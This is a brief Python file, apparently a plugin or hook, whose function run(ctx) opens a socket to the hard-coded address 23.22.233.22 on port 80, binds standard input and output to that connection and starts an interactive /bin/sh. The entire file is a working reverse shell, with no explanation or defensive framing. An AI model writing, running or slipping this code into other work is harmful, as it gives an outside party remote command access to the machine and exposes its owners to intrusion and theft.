import socket,subprocess,os

def run(ctx):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("23.22.233.22",80))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])